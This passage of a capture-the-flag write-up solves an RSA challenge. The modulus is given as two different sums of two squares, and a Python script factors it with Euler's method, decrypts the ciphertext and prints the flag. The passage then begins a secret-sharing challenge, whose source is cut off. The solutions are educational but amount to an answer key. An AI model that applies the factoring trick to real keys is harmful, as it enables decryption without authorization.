&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;139488614271687589953884690592970545345100917058745264617112217132329766542251923634602298183777415221556922931467521901793230800271771036880075840122128322419937786441619850848876309600263298041438727684373621920233326334840988865922273325440799379584418142760239470239003470212399313033715405566836809419407
&lt;&#x2F;span&gt;&lt;span&gt;68334789534409058399709747444525414762334123566273125910569662060699644186162637240997793681284151882169786866201685085241431171760907057806355318216602175990235605823755224694383202043476486594392938995563562039702918509120988489287149220217082428193897933957628562633459049042920472531693730366503272507672
&lt;&#x2F;span&gt;&lt;span&gt;124011822519139836919119491309637022805378274989854408578991029026928119002489232335977596528581855016599610031796540079373031282148998625318658034408770283112750172223328012238338715644743140990997114236125750813379366262418292349962679006556523851370694404238101553966330965676189731474108393418372330606063
&lt;&#x2F;span&gt;&lt;span&gt;93529593432394381438671783119087013080855868893236377597950059020717371498802208966524066540234253992421963224344343067174201693672350438201011499762718490958025617655722916641293034417795512315497126128726644064013248230211347407788186320320456853993252621916838570027019607155835349111757703654306736031792
&lt;&#x2F;span&gt;&lt;span&gt;2819638499688340337879314536945338371611392232636746056275506290935131270682791584873534866138393305591899169164183372576878693678187335219904407119253951099126339949954303448641761723704171837075206394491403411400326176280981393624784437102905397888236098861970020785226848615566768625581096019917060387964269283048823007992992874533775547300443032304973521568046956516203101626941042560505073773998143068621715480774707735064134961852206070850277695448391038882766344567740211926618750074636868149063283746597347807257171871016202588384726430246523650462866812935130465049824665395626882280287488078029119879891722
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Observations :&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;The modulus(n) is written as sum of two squares in two different ways&lt;&#x2F;li&gt;
&lt;li&gt;a,b,c,d values and ciphertext is given&lt;&#x2F;li&gt;
&lt;li&gt;&lt;code&gt;e&lt;&#x2F;code&gt; is not given, probably &lt;code&gt;65537&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;After searching about &lt;code&gt;sum of squares as modulus in RSA&lt;&#x2F;code&gt; I found this research paper https:&#x2F;&#x2F;www.mdpi.com&#x2F;2297-8747&#x2F;24&#x2F;2&#x2F;62&lt;&#x2F;p&gt;
&lt;p&gt;&quot;&quot;&quot;Consider a semi-prime number whose construction consists of primes $$ p1,p2, N = p1p2$$ , being Pythagorean,and having a representation on the Cartesian plane such that, $$p1 = x^2 + y^2$$. It can easily be shown that the product of two such primes can be represented as the sum of four squares from which two sums of two squares can be derived. For such a semi-prime, if the original construction is unknown and the sum of four squares is known, the original construction $$p1,p2$$ can be found.&quot;&quot;&quot;&lt;&#x2F;p&gt;
&lt;p&gt;Lets look at &lt;code&gt;Eulers Factorization&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;A semi-prime whose prime factors are Pythagorean can be expressed as the sum of four squares, from which two sums of squares can be derived.&lt;&#x2F;strong&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;A semi-prime $$N = p1p2, p1 = a^2+b^2, p2 = c^2+d^2$$ is expressed as the sum of four squares, such that:&lt;&#x2F;p&gt;
&lt;p&gt;$$
N=p1p2=(a^2+b^2)(c^2+d^2)=(ac)^2+(bc)^2+(ad)^2+(bd)^2
$$&lt;&#x2F;p&gt;
&lt;p&gt;Now in our case, $$ N = (a^2+b^2)= (c^2+d^2)$$. We can solve for $$p1, p2$$ as follows.&lt;&#x2F;p&gt;
&lt;p&gt;$$
(a^2+b^2)= (c^2+d^2)
$$&lt;&#x2F;p&gt;
&lt;p&gt;combining odds we get,&lt;&#x2F;p&gt;
&lt;p&gt;$$
(a^2-c^2)= (d^2-b^2) \
(a-c)(a+c) = (d-b)(d+b) \&lt;&#x2F;p&gt;
&lt;p&gt;p1 = \left(\frac{gcd(a-c,d-b)}{2}\right)^2 + \left(\frac{gcd(a+c,d+b)}{2}\right)^2\
p2 = \left(\frac{gcd(a+c,d-b)}{2}\right)^2 + \left(\frac{gcd(a-c,d+b)}{2}\right)^2\
$$&lt;&#x2F;p&gt;
&lt;p&gt;Enough math, lets implement this simple math in python&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;solve.py&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;Crypto&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;Util&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;number &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;long_to_bytes
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;sympy &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;*
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;math
&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;139488614271687589953884690592970545345100917058745264617112217132329766542251923634602298183777415221556922931467521901793230800271771036880075840122128322419937786441619850848876309600263298041438727684373621920233326334840988865922273325440799379584418142760239470239003470212399313033715405566836809419407
&lt;&#x2F;span&gt;&lt;span&gt;b &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;68334789534409058399709747444525414762334123566273125910569662060699644186162637240997793681284151882169786866201685085241431171760907057806355318216602175990235605823755224694383202043476486594392938995563562039702918509120988489287149220217082428193897933957628562633459049042920472531693730366503272507672
&lt;&#x2F;span&gt;&lt;span&gt;c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;124011822519139836919119491309637022805378274989854408578991029026928119002489232335977596528581855016599610031796540079373031282148998625318658034408770283112750172223328012238338715644743140990997114236125750813379366262418292349962679006556523851370694404238101553966330965676189731474108393418372330606063
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;93529593432394381438671783119087013080855868893236377597950059020717371498802208966524066540234253992421963224344343067174201693672350438201011499762718490958025617655722916641293034417795512315497126128726644064013248230211347407788186320320456853993252621916838570027019607155835349111757703654306736031792
&lt;&#x2F;span&gt;&lt;span&gt;cipher &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2819638499688340337879314536945338371611392232636746056275506290935131270682791584873534866138393305591899169164183372576878693678187335219904407119253951099126339949954303448641761723704171837075206394491403411400326176280981393624784437102905397888236098861970020785226848615566768625581096019917060387964269283048823007992992874533775547300443032304973521568046956516203101626941042560505073773998143068621715480774707735064134961852206070850277695448391038882766344567740211926618750074636868149063283746597347807257171871016202588384726430246523650462866812935130465049824665395626882280287488078029119879891722
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;g1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;b)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 
&lt;&#x2F;span&gt;&lt;span&gt;g2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;b)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;p &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;g1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;g1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;g2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;g2
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;g1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;b)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 
&lt;&#x2F;span&gt;&lt;span&gt;g2 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;gcd&lt;&#x2F;span&gt;&lt;span&gt;(a&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span&gt;c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span&gt;b)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2 
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;q &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;g1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;g1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;g2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;g2
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;phi &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(p&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span&gt;(q&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(phi)
&lt;&#x2F;span&gt;&lt;span&gt;d &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;65537&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span&gt;(phi))
&lt;&#x2F;span&gt;&lt;span&gt;plaintext &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;long_to_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;pow&lt;&#x2F;span&gt;&lt;span&gt;(cipher&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;n))
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Decrypted plaintext:&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;plaintext)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Output
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# Decrypted plaintext: b&amp;#39;ENO{Gauss_t0ld_u5_th3r3_1s_mor3_th4n_on3_d1men5i0n}&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h1 id=&quot;crypto-sebastian-s-secret-sharing&quot;&gt;&lt;a class=&quot;zola-anchor&quot; href=&quot;#crypto-sebastian-s-secret-sharing&quot; aria-label=&quot;Anchor link for: crypto-sebastian-s-secret-sharing&quot;&gt;Crypto - Sebastian&#x27;s Secret Sharing&lt;&#x2F;a&gt;&lt;&#x2F;h1&gt;
&lt;pre data-lang=&quot;text&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-text &quot;&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&lt;span&gt;Attached files : [sss.py]
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#fafafa;color:#61676c;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;#!&#x2F;usr&#x2F;bin&#x2F;env python3
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;random
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span&gt;decimal &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span&gt;Decimal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span&gt;getcontext
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#399ee6;&quot;&gt;SeSeSe&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;int&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;from_bytes&lt;&#x2F;span&gt;&lt;span&gt;(s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;byteorder&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;big&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;l &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(s) 	
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;n
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;t
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_a&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_a&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		c &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;s]
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;			a &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;Decimal&lt;&#x2F;span&gt;&lt;span&gt;(random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;randint&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;			c&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(a)
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span&gt;c
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):
&lt;&#x2F;span&gt;&lt;span&gt;		s &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;j &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;n):
&lt;&#x2F;span&gt;&lt;span&gt;			x &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;j
